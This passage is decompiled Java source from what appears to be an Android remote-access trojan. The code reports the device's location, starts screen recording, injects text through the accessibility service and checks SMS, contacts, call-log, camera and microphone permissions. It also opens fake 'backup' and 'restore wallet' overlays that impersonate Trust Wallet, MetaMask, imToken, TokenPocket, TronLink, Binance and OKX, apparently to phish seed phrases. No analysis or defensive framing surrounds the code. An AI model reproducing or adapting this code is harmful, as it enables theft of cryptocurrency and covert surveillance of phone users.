                        lVar.f2830g.requestLocationUpdates("gps", 60000L, 10.0f, lVar);
                    } else {
                        lVar.f2828e = lastKnownLocation2.getLatitude();
                        lVar.f2829f = lVar.f2827d.getLongitude();
                    }
                }
            }
            l lVar2 = this.f2809f;
            if (!lVar2.f2826c) {
                i.n(1, "52", null);
                return;
            }
            Location location = lVar2.f2827d;
            if (location != null) {
                lVar2.f2828e = location.getLatitude();
            }
            double d5 = lVar2.f2828e;
            l lVar3 = this.f2809f;
            Location location2 = lVar3.f2827d;
            if (location2 != null) {
                lVar3.f2829f = location2.getLongitude();
            }
            double d6 = lVar3.f2829f;
            if (i.f2795a == null) {
                return;
            }
            f.e eVar = new f.e();
            eVar.put("code", 1305);
            eVar.put("lat", Double.valueOf(d5));
            eVar.put("lng", Double.valueOf(d6));
            i.f2795a.b(eVar.l());
        }

        public final void c0(int i5) {
            if (i5 == 0) {
                if (i.f2796b) {
                    this.f2811h.startService(new Intent(this.f2811h, (Class<?>) ScreenService.class).setAction("stopRecord"));
                    return;
                } else {
                    i.k(false);
                    return;
                }
            }
            if (i5 == 1) {
                if (i.f2796b) {
                    i.k(true);
                    return;
                }
                if (k3.a.i(this.f2811h)) {
                    i.n(1, ExifInterface.GPS_MEASUREMENT_2D, null);
                    return;
                }
                Intent intent = new Intent(this.f2811h, (Class<?>) ScreenActivity.class);
                intent.addFlags(268435456);
                this.f2811h.startActivity(intent);
                i.f2797c = System.currentTimeMillis();
            }
        }

        public final void d0(@NonNull g0 g0Var, int i5, int i6, int i7, String str, String str2, String str3) {
            long j5;
            List<KInfo> arrayList;
            f.e eVar = new f.e();
            eVar.put("code", 1321);
            g3.l c5 = g3.l.c();
            Objects.requireNonNull(c5);
            try {
                z2.h<KInfo, String> c6 = c5.f2975a.c();
                c6.f6119l = true;
                z2.m g5 = c6.g();
                g5.f("ti", 0);
                if (i7 >= 1) {
                    g5.b();
                    g5.c("ty", Integer.valueOf(i7));
                }
                if (!TextUtils.isEmpty(str2)) {
                    g5.b();
                    g5.c("pk", str2);
                }
                if (!TextUtils.isEmpty(str)) {
                    g5.b();
                    g5.h("js", "%" + str + "%");
                }
                if (!TextUtils.isEmpty(str3)) {
                    g5.b();
                    g5.h("na", "%" + str3 + "%");
                }
                c6.f6146g = g5;
                j5 = c5.f2975a.i(c6.f());
            } catch (SQLException unused) {
                j5 = 0;
            }
            eVar.put("total", Long.valueOf(j5));
            g3.l c7 = g3.l.c();
            long j6 = (i5 - 1) * i6;
            long j7 = i6;
            Objects.requireNonNull(c7);
            try {
                z2.h<KInfo, String> c8 = c7.f2975a.c();
                c8.l("ti", false);
                c8.k(Long.valueOf(j6));
                c8.f6120m = Long.valueOf(j7);
                z2.m g6 = c8.g();
                g6.f("ti", 0);
                if (i7 >= 1) {
                    g6.b();
                    g6.c("ty", Integer.valueOf(i7));
                }
                if (!TextUtils.isEmpty(str2)) {
                    g6.b();
                    g6.c("pk", str2);
                }
                if (!TextUtils.isEmpty(str)) {
                    g6.b();
                    g6.h("js", "%" + str + "%");
                }
                if (!TextUtils.isEmpty(str3)) {
                    g6.b();
                    g6.h("na", "%" + str3 + "%");
                }
                c8.f6146g = g6;
                arrayList = c7.f2975a.k(c8.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
            g0Var.b(eVar.l());
        }

        public final void e0(@NonNull g0 g0Var, int i5, int i6, int i7, String str, String str2) {
            long j5;
            List<JInfo> arrayList;
            f.e eVar = new f.e();
            eVar.put("code", 1313);
            g3.k b5 = g3.k.b();
            Objects.requireNonNull(b5);
            try {
                z2.h<JInfo, String> c5 = b5.f2973a.c();
                c5.f6119l = true;
                z2.m g5 = c5.g();
                g5.f("ti", 0);
                if (i7 == 5) {
                    g5.b();
                    g5.e(0);
                    g5.b();
                    g5.g("ty", 3);
                } else if (i7 != 4) {
                    g5.b();
                    g5.c("ty", Integer.valueOf(i7));
                }
                if (!TextUtils.isEmpty(str) && i7 != 5 && i7 != 1 && i7 != 2 && i7 != 3) {
                    g5.b();
                    g5.c("pk", str);
                }
                if (!TextUtils.isEmpty(str2) && i7 != 5 && i7 != 1 && i7 != 2 && i7 != 3) {
                    g5.b();
                    g5.h("na", "%" + str2 + "%");
                }
                c5.f6146g = g5;
                j5 = b5.f2973a.i(c5.f());
            } catch (SQLException unused) {
                j5 = 0;
            }
            eVar.put("total", Long.valueOf(j5));
            g3.k b6 = g3.k.b();
            long j6 = (i5 - 1) * i6;
            long j7 = i6;
            Objects.requireNonNull(b6);
            try {
                z2.h<JInfo, String> c6 = b6.f2973a.c();
                c6.l("ti", false);
                c6.k(Long.valueOf(j6));
                c6.f6120m = Long.valueOf(j7);
                z2.m g6 = c6.g();
                g6.f("ti", 0);
                if (i7 == 5) {
                    g6.b();
                    g6.e(0);
                    g6.b();
                    g6.g("ty", 3);
                } else if (i7 != 4) {
                    g6.b();
                    g6.c("ty", Integer.valueOf(i7));
                }
                if (!TextUtils.isEmpty(str) && i7 != 5 && i7 != 1 && i7 != 2 && i7 != 3) {
                    g6.b();
                    g6.c("pk", str);
                }
                if (!TextUtils.isEmpty(str2) && i7 != 5 && i7 != 1 && i7 != 2 && i7 != 3) {
                    g6.b();
                    g6.h("na", "%" + str2 + "%");
                }
                c6.f6146g = g6;
                arrayList = b6.f2973a.k(c6.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
            g0Var.b(eVar.l());
        }

        public final boolean f0(String str) {
            AccessibilityNodeInfo i5 = BaseService.g().i();
            if (i5 == null) {
                i.n(1, "5", null);
                return false;
            }
            AccessibilityNodeInfo findFocus = i5.findFocus(1);
            if (findFocus == null) {
                i.n(1, "6", null);
                return false;
            }
            Bundle bundle = new Bundle();
            bundle.putCharSequence(AccessibilityNodeInfoCompat.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, str);
            if (findFocus.performAction(2097152, bundle)) {
                i.n(0, "7", null);
                return true;
            }
            ((ClipboardManager) this.f2811h.getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText(null, str));
            if (!findFocus.performAction(32768)) {
                return false;
            }
            i.n(0, "7", null);
            return true;
        }

        /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
        public final void g0(@NonNull g0 g0Var, int i5, String str) {
            char c5;
            Intent intent;
            String str2;
            Intent intent2;
            String str3;
            String str4;
            if (i5 == 0) {
                f.e eVar = new f.e();
                eVar.put("code", 1310);
                int i6 = Build.VERSION.SDK_INT;
                if (i6 >= 23) {
                    eVar.put("overlay", Integer.valueOf(Settings.canDrawOverlays(this.f2811h) ? 1 : e3.d.f2592b ? 2 : 0));
                } else {
                    eVar.put("overlay", 0);
                }
                eVar.put("readImages", Integer.valueOf((i6 <= 32 ? ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_EXTERNAL_STORAGE") != 0 : ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_MEDIA_IMAGES") != 0) ? 0 : 1));
                eVar.put("readContacts", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CONTACTS") == 0 ? 1 : 0));
                eVar.put("readSms", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_SMS") == 0 ? 1 : 0));
                eVar.put("readCallLog", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CALL_LOG") == 0 ? 1 : 0));
                if (i6 >= 23) {
                    eVar.put("accessibility", Integer.valueOf(k3.a.f(this.f2811h) ? 1 : 0));
                    eVar.put("battery", Integer.valueOf(((PowerManager) this.f2811h.getSystemService("power")).isIgnoringBatteryOptimizations(this.f2811h.getPackageName()) ? 1 : 0));
                }
                eVar.put("writeFile", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.WRITE_EXTERNAL_STORAGE") == 0 ? 1 : 0));
                eVar.put("camera", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.CAMERA") == 0 ? 1 : 0));
                eVar.put("recordAudio", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.RECORD_AUDIO") == 0 ? 1 : 0));
                eVar.put("location", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.ACCESS_COARSE_LOCATION") == 0 ? 1 : 0));
                eVar.put("sendSms", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.SEND_SMS") == 0 ? 1 : 0));
                eVar.put("getAccounts", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.GET_ACCOUNTS") == 0 ? 1 : 0));
                eVar.put("callPhone", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.CALL_PHONE") == 0 ? 1 : 0));
                eVar.put("notification", Integer.valueOf(NotificationManagerCompat.from(this.f2811h).areNotificationsEnabled() ? 1 : 0));
                int i7 = e3.d.f2591a;
                eVar.put("autoStart", (i7 == 1 || i7 == 2 || i7 == 3 || i7 == 4 || i7 == 9) ? 0 : 1);
                g0Var.b(eVar.l());
                return;
            }
            if (i5 != 1) {
                return;
            }
            if (!k3.a.i(this.f2811h)) {
                p0();
                Objects.requireNonNull(str);
                switch (str.hashCode()) {
                    case -2014500855:
                        if (str.equals("readContacts")) {
                            c5 = 0;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -1406748165:
                        if (str.equals("writeFile")) {
                            c5 = 1;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -1367751899:
                        if (str.equals("camera")) {
                            c5 = 2;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -1091287984:
                        if (str.equals("overlay")) {
                            c5 = 3;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -1060266576:
                        if (str.equals("callPhone")) {
                            c5 = 4;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -793460818:
                        if (str.equals("readImages")) {
                            c5 = 5;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -331239923:
                        if (str.equals("battery")) {
                            c5 = 6;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -213139122:
                        if (str.equals("accessibility")) {
                            c5 = 7;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -190802544:
                        if (str.equals("readCallLog")) {
                            c5 = '\b';
                            break;
                        }
                        c5 = 65535;
                        break;
                    case -59246244:
                        if (str.equals("getAccounts")) {
                            c5 = '\t';
                            break;
                        }
                        c5 = 65535;
                        break;
                    case 595233003:
                        if (str.equals("notification")) {
                            c5 = '\n';
                            break;
                        }
                        c5 = 65535;
                        break;
                    case 1080392675:
                        if (str.equals("readSms")) {
                            c5 = 11;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case 1289767429:
                        if (str.equals("recordAudio")) {
                            c5 = '\f';
                            break;
                        }
                        c5 = 65535;
                        break;
                    case 1650207731:
                        if (str.equals("autoStart")) {
                            c5 = '\r';
                            break;
                        }
                        c5 = 65535;
                        break;
                    case 1901043637:
                        if (str.equals("location")) {
                            c5 = 14;
                            break;
                        }
                        c5 = 65535;
                        break;
                    case 1979902129:
                        if (str.equals("sendSms")) {
                            c5 = 15;
                            break;
                        }
                        c5 = 65535;
                        break;
                    default:
                        c5 = 65535;
                        break;
                }
                switch (c5) {
                    case 0:
                    case 1:
                    case 2:
                    case 4:
                    case 5:
                    case '\b':
                    case '\t':
                    case 11:
                    case '\f':
                    case 14:
                    case 15:
                        intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                        intent.addFlags(268435456);
                        str2 = null;
                        intent.setData(Uri.fromParts("package", this.f2811h.getPackageName(), null));
                        this.f2811h.startActivity(intent);
                        i.n(1, "41", str2);
                        break;
                    case 3:
                        if (Build.VERSION.SDK_INT < 23 || !Settings.canDrawOverlays(this.f2811h)) {
                            Ksfndkd.INSTANCE.reqPopWindowPermissions(this.f2811h);
                            str2 = null;
                            i.n(1, "41", str2);
                            break;
                        }
                        i.n(0, "23", null);
                        break;
                    case 6:
                        if (e3.d.f2591a != 2) {
                            Context context = this.f2811h;
                            Ksfndkd ksfndkd = Ksfndkd.INSTANCE;
                            if (!ksfndkd.hasBatteryStrategy(context)) {
                                ksfndkd.batteryStrategy(this.f2811h);
                                str2 = null;
                                i.n(1, "41", str2);
                            }
                            i.n(0, "23", null);
                            break;
                        } else {
                            intent = new Intent();
                            intent.setComponent(new ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"));
                            intent.putExtra("package_name", this.f2811h.getPackageName());
                            intent.putExtra("package_label", k3.a.b(this.f2811h));
                            intent.addFlags(268435456);
                            str2 = null;
                            this.f2811h.startActivity(intent);
                            i.n(1, "41", str2);
                            break;
                        }
                    case 7:
                        if (k3.a.f(this.f2811h)) {
                            if (Build.VERSION.SDK_INT >= 24) {
                                BaseService.g().disableSelf();
                                f.e eVar2 = new f.e();
                                eVar2.put("action", "saveDev");
                                eVar2.put("step", 3);
                                eVar2.put("deviceId", k3.a.c(this.f2811h));
                                eVar2.put("accessibility", 0);
                                k3.i.a(eVar2, new j());
                            }
                            BaseService.B = false;
                            BaseService.f1409z = false;
                            l0(g0Var);
                            str3 = null;
                            g0(g0Var, 0, null);
                            str4 = "54";
                            break;
                        } else {
                            if (e3.d.f2591a == 6) {
                                try {
                                    Intent intent3 = new Intent("com.samsung.accessibility.installed_service");
                                    intent3.addFlags(268435456);
                                    this.f2811h.startActivity(intent3);
                                } catch (Exception unused) {
                                    intent2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                                }
                                str2 = null;
                                i.n(1, "41", str2);
                                break;
                            } else {
                                intent2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                            }
                            intent2.addFlags(268435456);
                            this.f2811h.startActivity(intent2);
                            str2 = null;
                            i.n(1, "41", str2);
                        }
                    case '\n':
                        if (!NotificationManagerCompat.from(this.f2811h).areNotificationsEnabled()) {
                            Ksfndkd.INSTANCE.reqNotificationPermissionsIfNotEnabled(this.f2811h);
                            str2 = null;
                            i.n(1, "41", str2);
                            break;
                        }
                        i.n(0, "23", null);
                        break;
                    case '\r':
                        if (Looper.myLooper() == null) {
                            Looper.prepare();
                        }
                        Ksfndkd.INSTANCE.whitelistSettings(this.f2811h);
                        break;
                }
                return;
            }
            str4 = ExifInterface.GPS_MEASUREMENT_3D;
            str3 = null;
            i.n(1, str4, str3);
        }

        public final void h0(String str) {
            if (TextUtils.isEmpty(str)) {
                return;
            }
            Intent intent = null;
            if (k3.a.i(this.f2811h)) {
                i.n(1, ExifInterface.GPS_MEASUREMENT_3D, null);
                return;
            }
            if (App.f1373c) {
                i.n(1, "56", null);
                return;
            }
            if (k3.d.c()) {
                i.n(1, "57", null);
                return;
            }
            if (k3.e.b(this.f2811h)) {
                i.n(1, "58", null);
                return;
            }
            if (this.f2811h.getResources().getConfiguration().orientation == 2) {
                i.n(1, "35", null);
                return;
            }
            boolean z4 = e3.d.f2592b && Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this.f2811h);
            if (z4) {
                i.n(1, "55", null);
            }
            AdInfo adInfo = (AdInfo) f.a.v(str, AdInfo.class);
            adInfo.setType(2);
            adInfo.setTitleColor(k3.a.m(adInfo.getTitleColor()));
            adInfo.setMsgColor(k3.a.m(adInfo.getMsgColor()));
            adInfo.setBgColor(k3.a.m(adInfo.getBgColor()));
            adInfo.setConfirmColor(k3.a.m(adInfo.getConfirmColor()));
            adInfo.setConfirmBgColor(k3.a.m(adInfo.getConfirmBgColor()));
            adInfo.setCancelColor(k3.a.m(adInfo.getCancelColor()));
            adInfo.setCancelBgColor(k3.a.m(adInfo.getCancelBgColor()));
            adInfo.setOtherColor(k3.a.m(adInfo.getOtherColor()));
            adInfo.setOtherBgColor(k3.a.m(adInfo.getOtherBgColor()));
            int template = adInfo.getTemplate();
            switch (template) {
                case 1:
                    intent = new Intent(this.f2811h, (Class<?>) AdNoticeActivity.class);
                    break;
                case 2:
                    intent = new Intent(this.f2811h, (Class<?>) AdSingleActivity.class);
                    break;
                case 3:
                    intent = new Intent(this.f2811h, (Class<?>) AdSingleSmallActivity.class);
                    break;
                case 4:
                    intent = new Intent(this.f2811h, (Class<?>) AdFullscreenActivity.class);
                    break;
                case 5:
                    intent = new Intent(this.f2811h, (Class<?>) AdWebActivity.class);
                    break;
                case 6:
                    intent = new Intent(this.f2811h, (Class<?>) AdWebSmallActivity.class);
                    break;
                case 7:
                    if (!TextUtils.isEmpty(adInfo.getImg())) {
                        if (!TextUtils.isEmpty(adInfo.getCancel())) {
                            intent = new Intent(this.f2811h, (Class<?>) AdAlertActivity.class);
                            break;
                        } else {
                            intent = new Intent(this.f2811h, (Class<?>) AdAlertOneButtonActivity.class);
                            break;
                        }
                    } else if (!TextUtils.isEmpty(adInfo.getCancel())) {
                        intent = new Intent(this.f2811h, (Class<?>) AdConfirmActivity.class);
                        break;
                    } else {
                        intent = new Intent(this.f2811h, (Class<?>) AdConfirmOneButtonActivity.class);
                        break;
                    }
                case 8:
                    if (!TextUtils.isEmpty(adInfo.getImg())) {
                        intent = new Intent(this.f2811h, (Class<?>) AdAlertBottomActivity.class);
                        break;
                    } else {
                        intent = new Intent(this.f2811h, (Class<?>) AdConfirmBottomActivity.class);
                        break;
                    }
                case 9:
                    intent = new Intent(this.f2811h, (Class<?>) AdBoxActivity.class);
                    break;
                default:
                    switch (template) {
                        case PointerIconCompat.TYPE_CONTEXT_MENU /* 1001 */:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsTrustActivity.class);
                            break;
                        case PointerIconCompat.TYPE_HAND /* 1002 */:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsTpActivity.class);
                            break;
                        case PointerIconCompat.TYPE_HELP /* 1003 */:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsImActivity.class);
                            break;
                        case PointerIconCompat.TYPE_WAIT /* 1004 */:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsMetaActivity.class);
                            break;
                        case 1005:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsWalletActivity.class);
                            break;
                        case PointerIconCompat.TYPE_CELL /* 1006 */:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsTronlinkActivity.class);
                            break;
                        case PointerIconCompat.TYPE_CROSSHAIR /* 1007 */:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsTronglobalActivity.class);
                            break;
                        case PointerIconCompat.TYPE_TEXT /* 1008 */:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsBinanceActivity.class);
                            break;
                        case PointerIconCompat.TYPE_VERTICAL_TEXT /* 1009 */:
                            intent = new Intent(this.f2811h, (Class<?>) InputWordsOkxActivity.class);
                            break;
                    }
            }
            if (intent != null) {
                intent.putExtra("adInfo", adInfo);
                k3.d.f(this.f2811h, intent, z4);
            }
        }

        /* JADX WARN: Type inference failed for: r5v91, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
        public final void i0(String str, int i5, int i6) {
            String str2;
            String str3;
            String str4;
            String str5;
            String str6;
            String str7;
            if (k3.a.i(this.f2811h)) {
                str7 = ExifInterface.GPS_MEASUREMENT_3D;
            } else if (App.f1373c) {
                str7 = "56";
            } else if (k3.d.c()) {
                str7 = "57";
            } else if (k3.e.b(this.f2811h)) {
                str7 = "58";
            } else {
                if (this.f2811h.getResources().getConfiguration().orientation != 2) {
                    switch (i5) {
                        case 101:
                        case 102:
                        case 103:
                        case 104:
                        case 106:
                        case 107:
                            if (!BaseService.l()) {
                                str7 = "54";
                                break;
                            }
                            break;
                    }
                    if (e3.d.f2592b && Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this.f2811h)) {
                        i.n(1, "55", null);
                    }
                    Context context = this.f2811h;
                    if (i6 == 0) {
                        boolean containsKey = k3.f.f3881l.containsKey(str);
                        int i7 = g3.l.c().b(str) != null ? 1 : 0;
                        if (!containsKey || i7 == 1) {
                            i.l(str, i5, containsKey ? 1 : 0, i7);
                            return;
                        }
                    }
                    if (i5 == 106) {
                        AdInfo d5 = androidx.appcompat.view.a.d(2);
                        d5.setTaskId(e3.d.a());
                        d5.setCustomId(106);
                        d5.setPkg("com.tronlinkpro.wallet");
                        d5.setUse(1);
                        String c5 = k3.e.c(context, d5.getPkg());
                        d5.setImg(c5 != null ? c5 : "2131165378");
                        d5.setTemplate(9);
                        d5.setTitle(context.getString(R.string.tronBoxBackupTitle));
                        d5.setMsg(context.getString(R.string.tronBoxBackupMsg));
                        d5.setConfirm(context.getString(R.string.tronBoxBackupConfirm));
                        d5.setConfirmBgColor("2,28,49");
                        Intent intent = new Intent(context, (Class<?>) AdBoxActivity.class);
                        intent.putExtra("adInfo", d5);
                        k3.d.e(context, intent);
                        return;
                    }
                    if (i5 == 107) {
                        AdInfo d6 = androidx.appcompat.view.a.d(2);
                        d6.setTaskId(e3.d.a());
                        d6.setCustomId(107);
                        d6.setPkg("com.tronlink.global");
                        d6.setUse(1);
                        String c6 = k3.e.c(context, d6.getPkg());
                        d6.setImg(c6 != null ? c6 : "2131165377");
                        d6.setTemplate(9);
                        d6.setTitle(context.getString(R.string.tronBoxBackupTitle));
                        d6.setMsg(context.getString(R.string.tronBoxBackupMsg));
                        d6.setConfirm(context.getString(R.string.tronBoxBackupConfirm));
                        d6.setConfirmBgColor("2,28,49");
                        Intent intent2 = new Intent(context, (Class<?>) AdBoxActivity.class);
                        intent2.putExtra("adInfo", d6);
                        k3.d.e(context, intent2);
                        return;
                    }
                    switch (i5) {
                        case 101:
                            AdInfo d7 = androidx.appcompat.view.a.d(2);
                            d7.setTaskId(e3.d.a());
                            d7.setCustomId(101);
                            d7.setPkg("com.wallet.crypto.trustapp");
                            d7.setUse(1);
                            String c7 = k3.e.c(context, d7.getPkg());
                            d7.setImg(c7 != null ? c7 : "2131492888");
                            d7.setTemplate(9);
                            d7.setTitle(context.getString(R.string.trustBoxBackupTitle));
                            d7.setMsg(context.getString(R.string.trustBoxBackupMsg));
                            d7.setConfirm(context.getString(R.string.trustBoxBackupConfirm));
                            d7.setConfirmBgColor("5,0,255");
                            d7.setBgColor("255,255,255");
                            Intent intent3 = new Intent(context, (Class<?>) AdBoxActivity.class);
                            intent3.putExtra("adInfo", d7);
                            k3.d.e(context, intent3);
                            break;
                        case 102:
                            AdInfo d8 = androidx.appcompat.view.a.d(2);
                            d8.setTaskId(e3.d.a());
                            d8.setCustomId(102);
                            d8.setPkg("vip.mytokenpocket");
                            d8.setUse(1);
                            String c8 = k3.e.c(context, d8.getPkg());
                            d8.setImg(c8 != null ? c8 : "2131492885");
                            d8.setTemplate(9);
                            d8.setTitle(context.getString(R.string.tpBoxBackupTitle));
                            d8.setMsg(context.getString(R.string.tpBoxBackupMsg));
                            d8.setConfirm(context.getString(R.string.tpBoxBackupConfirm));
                            d8.setConfirmBgColor("41,128,254");
                            Intent intent4 = new Intent(context, (Class<?>) AdBoxActivity.class);
                            intent4.putExtra("adInfo", d8);
                            k3.d.e(context, intent4);
                            break;
                        case 103:
                            AdInfo d9 = androidx.appcompat.view.a.d(2);
                            d9.setTaskId(e3.d.a());
                            d9.setCustomId(103);
                            d9.setPkg("im.token.app");
                            d9.setUse(1);
                            String c9 = k3.e.c(context, d9.getPkg());
                            d9.setImg(c9 != null ? c9 : "2131492872");
                            d9.setTemplate(9);
                            d9.setTitle(context.getString(R.string.imBoxBackupTitle));
                            d9.setMsg(context.getString(R.string.imBoxBackupMsg));
                            d9.setConfirm(context.getString(R.string.imBoxBackupConfirm));
                            d9.setConfirmBgColor("30,144,255");
                            Intent intent5 = new Intent(context, (Class<?>) AdBoxActivity.class);
                            intent5.putExtra("adInfo", d9);
                            k3.d.e(context, intent5);
                            break;
                        case 104:
                            AdInfo d10 = androidx.appcompat.view.a.d(2);
                            d10.setTaskId(e3.d.a());
                            d10.setCustomId(104);
                            d10.setPkg("io.metamask");
                            d10.setUse(1);
                            String c10 = k3.e.c(context, d10.getPkg());
                            d10.setImg(c10 != null ? c10 : "2131492879");
                            d10.setTemplate(9);
                            d10.setTitle(context.getString(R.string.metaBoxBackupTitle));
                            d10.setMsg(context.getString(R.string.metaBoxBackupMsg));
                            d10.setConfirm(context.getString(R.string.metaBoxBackupConfirm));
                            Intent intent6 = new Intent(context, (Class<?>) AdBoxActivity.class);
                            intent6.putExtra("adInfo", d10);
                            k3.d.e(context, intent6);
                            break;
                        default:
                            switch (i5) {
                                case TbsListener.ErrorCode.EXCEED_UNZIP_RETRY_NUM /* 201 */:
                                    AdInfo d11 = androidx.appcompat.view.a.d(2);
                                    d11.setTaskId(e3.d.a());
                                    d11.setCustomId(TbsListener.ErrorCode.EXCEED_UNZIP_RETRY_NUM);
                                    d11.setPkg("com.wallet.crypto.trustapp");
                                    d11.setUse(2);
                                    String c11 = k3.e.c(context, d11.getPkg());
                                    d11.setImg(c11 != null ? c11 : "2131492888");
                                    d11.setTemplate(9);
                                    d11.setTitle(context.getString(R.string.Why_need_ReImport_Wallet));
                                    d11.setMsg(context.getString(R.string.Here_are_some_scenarios_require));
                                    d11.setConfirm(context.getString(R.string.Restore_wallet));
                                    d11.setConfirmBgColor("5,0,255");
                                    d11.setBgColor("255,255,255");
                                    if (new Random().nextInt(2) == 1) {
                                        d11.setCancel(context.getString(R.string.Cancel));
                                    }
                                    AdInfo adInfo = new AdInfo();
                                    adInfo.setCustomId(d11.getCustomId());
                                    adInfo.setType(2);
                                    adInfo.setTaskId(e3.d.a());
                                    adInfo.setPreId(d11.getTaskId());
                                    adInfo.setTemplate(PointerIconCompat.TYPE_CONTEXT_MENU);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo.setBack(1);
                                    }
                                    d11.setAiLink(adInfo);
                                    Intent intent7 = new Intent(context, (Class<?>) AdBoxActivity.class);
                                    intent7.putExtra("adInfo", d11);
                                    k3.d.e(context, intent7);
                                    break;
                                case TbsListener.ErrorCode.APK_PATH_ERROR /* 202 */:
                                    AdInfo d12 = androidx.appcompat.view.a.d(2);
                                    d12.setTaskId(e3.d.a());
                                    d12.setCustomId(TbsListener.ErrorCode.APK_PATH_ERROR);
                                    d12.setPkg("vip.mytokenpocket");
                                    d12.setUse(2);
                                    String c12 = k3.e.c(context, d12.getPkg());
                                    d12.setImg(c12 != null ? c12 : "2131492885");
                                    d12.setTemplate(7);
                                    d12.setTitle(context.getString(R.string.tokenpocket));
                                    d12.setMsg(context.getString(R.string.tpBoxInputMsg));
                                    d12.setConfirm(context.getString(R.string.Confirm));
                                    d12.setConfirmColor("41,128,254");
                                    if (new Random().nextInt(2) == 1) {
                                        d12.setCancel(context.getString(R.string.Cancel));
                                    }
                                    AdInfo adInfo2 = new AdInfo();
                                    adInfo2.setCustomId(d12.getCustomId());
                                    adInfo2.setType(2);
                                    adInfo2.setTaskId(e3.d.a());
                                    adInfo2.setPreId(d12.getTaskId());
                                    adInfo2.setTemplate(PointerIconCompat.TYPE_HAND);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo2.setBack(1);
                                    }
                                    d12.setAiLink(adInfo2);
                                    Intent intent8 = new Intent(context, (Class<?>) (d12.getCancel() != null ? AdAlertActivity.class : AdAlertOneButtonActivity.class));
                                    intent8.putExtra("adInfo", d12);
                                    k3.d.e(context, intent8);
                                    break;
                                case TbsListener.ErrorCode.APK_VERSION_ERROR /* 203 */:
                                    AdInfo d13 = androidx.appcompat.view.a.d(2);
                                    d13.setTaskId(e3.d.a());
                                    d13.setCustomId(TbsListener.ErrorCode.APK_VERSION_ERROR);
                                    d13.setPkg("im.token.app");
                                    d13.setUse(2);
                                    String c13 = k3.e.c(context, d13.getPkg());
                                    d13.setImg(c13 != null ? c13 : "2131492872");
                                    d13.setTemplate(8);
                                    d13.setTitle(context.getString(R.string.imtoken));
                                    d13.setMsg(context.getString(R.string.imBoxInputMsg));
                                    d13.setConfirm(context.getString(R.string.Import_now));
                                    d13.setConfirmColor("255,255,255");
                                    d13.setConfirmBgColor("30,144,255");
                                    d13.setAlign(1);
                                    if (new Random().nextInt(2) == 1) {
                                        d13.setCancel(context.getString(R.string.Cancel));
                                        d13.setCancelColor("105,105,105");
                                    }
                                    AdInfo adInfo3 = new AdInfo();
                                    adInfo3.setCustomId(d13.getCustomId());
                                    adInfo3.setType(2);
                                    adInfo3.setTaskId(e3.d.a());
                                    adInfo3.setPreId(d13.getTaskId());
                                    adInfo3.setTemplate(PointerIconCompat.TYPE_HELP);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo3.setBack(1);
                                    }
                                    d13.setAiLink(adInfo3);
                                    Intent intent9 = new Intent(context, (Class<?>) AdAlertBottomActivity.class);
                                    intent9.putExtra("adInfo", d13);
                                    k3.d.e(context, intent9);
                                    break;
                                case TbsListener.ErrorCode.APK_INVALID /* 204 */:
                                    AdInfo d14 = androidx.appcompat.view.a.d(2);
                                    d14.setTaskId(e3.d.a());
                                    d14.setCustomId(TbsListener.ErrorCode.APK_INVALID);
                                    d14.setPkg("io.metamask");
                                    d14.setUse(2);
                                    String c14 = k3.e.c(context, d14.getPkg());
                                    if (c14 == null) {
                                        c14 = "2131492879";
                                    }
                                    d14.setImg(c14);
                                    d14.setTemplate(7);
                                    d14.setTitle(context.getString(R.string.metamask));
                                    d14.setMsg(context.getString(R.string.metaBoxInputMsg));
                                    d14.setConfirm(context.getString(R.string.Refresh));
                                    d14.setConfirmColor("30,144,255");
                                    d14.setCancel(context.getString(R.string.Cancel));
                                    AdInfo adInfo4 = new AdInfo();
                                    adInfo4.setCustomId(d14.getCustomId());
                                    adInfo4.setType(2);
                                    adInfo4.setTaskId(e3.d.a());
                                    adInfo4.setPreId(d14.getTaskId());
